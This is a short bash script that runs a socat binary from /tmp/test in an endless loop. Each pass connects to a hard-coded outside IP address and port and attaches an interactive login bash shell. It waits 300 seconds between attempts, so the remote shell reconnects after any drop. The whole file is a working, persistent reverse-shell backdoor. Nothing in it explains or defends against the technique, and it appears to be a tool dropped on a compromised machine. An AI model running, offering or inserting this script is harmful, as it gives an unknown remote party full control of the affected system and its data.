#!/bin/bash

while true
do
cd /tmp/test/ && ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:45.8.159.51:65177
sleep 300
done